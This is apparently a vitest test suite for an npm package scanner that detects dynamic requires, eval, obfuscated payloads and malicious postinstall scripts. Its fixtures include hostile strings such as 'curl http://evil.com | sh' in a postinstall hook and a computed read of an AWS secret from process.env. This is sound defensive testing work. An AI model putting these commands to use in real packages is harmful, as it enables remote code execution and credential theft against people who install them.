import { describe, it, expect } from 'vitest';
import { analyzeScriptAST } from '../src/scanners/ast.js';
import { deobfuscateScript } from '../src/scanners/deobfuscation.js';
import { analyzePackage } from '../src/scanners/lifecycle.js';
import * as fs from 'node:fs';
import * as path from 'node:path';

const FIXTURES = path.join(__dirname, 'fixtures');

function loadFixture(name: string) {
  return JSON.parse(fs.readFileSync(path.join(FIXTURES, name), 'utf-8'));
}

describe('AST Pattern Matching', () => {
  it('detects dynamic require with variable argument', () => {
    const script = "const mod = 'child_process'; require(mod).exec('evil')";
    const findings = analyzeScriptAST(script);

    expect(findings.length).toBeGreaterThan(0);
    expect(findings.some(f => f.pattern === 'ast-dynamic-require')).toBe(true);
  });

  it('detects dynamic require with string concatenation', () => {
    const script = "require('child_' + 'process').exec('curl evil.com | sh')";
    const findings = analyzeScriptAST(script);

    expect(findings.some(f => f.pattern === 'ast-dynamic-require')).toBe(true);
  });

  it('detects computed eval call', () => {
    const script = "const code = 'console.log(\"pwned\")'; eval(code)";
    const findings = analyzeScriptAST(script);

    expect(findings.some(f => f.pattern === 'ast-computed-eval')).toBe(true);
  });

  it('detects computed property access on process.env', () => {
    const script = "const key = 'AWS_SECRET'; process.env[key]";
    const findings = analyzeScriptAST(script);

    expect(findings.some(f => f.pattern === 'ast-computed-property')).toBe(true);
  });

  it('does not flag legitimate require with literal arguments', () => {
    const script = "require('lodash').map([1, 2, 3], x => x * 2)";
    const findings = analyzeScriptAST(script);

    expect(findings.length).toBe(0);
  });

  it('handles malformed JavaScript gracefully (returns empty array)', () => {
    const script = "this is not valid javascript {{{";
    const findings = analyzeScriptAST(script);

    expect(findings).toEqual([]);
  });

  it('handles extremely large scripts (>1MB) without crashing', () => {
    const largeScript = 'a'.repeat(1_000_001); // > 1MB
    const findings = analyzeScriptAST(largeScript);

    expect(findings).toEqual([]);
  });
});

describe('Deobfuscation', () => {
  it('decodes base64-encoded eval payloads', () => {
    const script = "eval(atob('ZXZhbCgnY29uc29sZS5sb2coInB3bmVkIiknKQ=='))";
    const result = deobfuscateScript(script);

    expect(result.success).toBe(true);
    expect(result.iterations).toBeGreaterThan(0);
    expect(result.techniques).toContain('base64-atob');
    expect(result.deobfuscated).toContain('eval');
  });

  it('decodes hex escape sequences', () => {
    const script = "\\x72\\x65\\x71\\x75\\x69\\x72\\x65";
    const result = deobfuscateScript(script);

    expect(result.success).toBe(true);
    expect(result.techniques).toContain('hex-escape');
    expect(result.deobfuscated).toContain('require');
  });

  it('decodes unicode escape sequences', () => {
    const script = "\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065";
    const result = deobfuscateScript(script);

    expect(result.success).toBe(true);
    expect(result.techniques).toContain('unicode-escape');
    expect(result.deobfuscated).toContain('require');
  });

  it('stops after max iterations', () => {
    // This script would require more than 2 iterations to fully decode
    const script = "eval(atob('\\x72\\x65\\x71'))";
    const result = deobfuscateScript(script, 2);

    expect(result.iterations).toBeLessThanOrEqual(2);
  });

  it('returns original if deobfuscation produces invalid syntax', () => {
    const script = "some invalid syntax that becomes even worse after decoding";
    const result = deobfuscateScript(script);

    // Should return original if deobfuscation fails validation
    expect(result).toBeDefined();
  });

  it('handles exponential unpacking (size limit)', () => {
    // Test that large scripts are handled correctly
    const veryLargeScript = 'a'.repeat(500000); // 500KB script
    const result = deobfuscateScript(veryLargeScript);

    // Should handle without issues (either skip or process successfully)
    expect(result).toBeDefined();
    expect(result.deobfuscated).toBeDefined();
  });

  it('logs techniques used', () => {
    const script = "eval(atob('dGVzdA=='))";
    const result = deobfuscateScript(script);

    expect(result.techniques).toBeDefined();
    expect(result.techniques.length).toBeGreaterThan(0);
  });
});

describe('Integration: Full Pipeline', () => {
  it('detects obfuscated package with base64 encoding', () => {
    const pkg = loadFixture('deobfuscation-base64.json');
    const result = analyzePackage(pkg.name, pkg.version, pkg.scripts);

    // Should detect base64 execution pattern
    expect(result.findings.length).toBeGreaterThan(0);
    expect(result.findings.some(f => f.pattern === 'base64-exec' || f.pattern.includes('deobfuscated'))).toBe(true);
  });

  it('detects obfuscated package with hex encoding', () => {
    const pkg = loadFixture('deobfuscation-hex.json');
    const result = analyzePackage(pkg.name, pkg.version, pkg.scripts);

    // Should detect hex-encoded require
    expect(result.findings.length).toBeGreaterThan(0);
    expect(result.riskLevel).toBe('high');
  });

  it('detects dynamic require pattern', () => {
    const pkg = loadFixture('ast-dynamic-require.json');
    const result = analyzePackage(pkg.name, pkg.version, pkg.scripts);

    // Should detect dynamic require
    expect(result.findings.length).toBeGreaterThan(0);
    expect(result.findings.some(f => f.pattern === 'ast-dynamic-require' || f.riskLevel === 'high' || f.riskLevel === 'critical')).toBe(true);
  });

  it('graceful degradation if AST parsing fails', () => {
    // Package with valid regex patterns but malformed JS for AST
    const pkg = {
      name: 'test-pkg',
      version: '1.0.0',
      scripts: {
        postinstall: 'curl http://evil.com | sh' // Valid shell but not valid JS
      }
    };

    const result = analyzePackage(pkg.name, pkg.version, pkg.scripts);

    // Should still detect curl-pipe via regex even if AST fails
    expect(result.findings.length).toBeGreaterThan(0);
  });

  it('graceful degradation if deobfuscation fails', () => {
    const pkg = {
      name: 'test-pkg',
      version: '1.0.0',
      scripts: {
        postinstall: 'eval(someFunctionThatProducesInvalidOutput())'
      }
    };

    // Should not crash
    expect(() => {
      analyzePackage(pkg.name, pkg.version, pkg.scripts);
    }).not.toThrow();
  });
});

describe('Performance', () => {
  it('AST analysis completes in reasonable time', () => {
    const complexScript = `
      const a = 'child_' + 'process';
      const b = 'process';
      const c = 'env';
      ${'require("fs");\n'.repeat(100)}
    `;

    const start = Date.now();
    const findings = analyzeScriptAST(complexScript);
    const duration = Date.now() - start;

    expect(duration).toBeLessThan(100); // Should complete in < 100ms
  });

  it('deobfuscation completes in reasonable time', () => {
    const complexScript = `
      eval(atob('dGVzdA=='));
      \\x74\\x65\\x73\\x74
    `;

    const start = Date.now();
    const result = deobfuscateScript(complexScript);
    const duration = Date.now() - start;

    expect(duration).toBeLessThan(50); // Should complete in < 50ms
  });
});
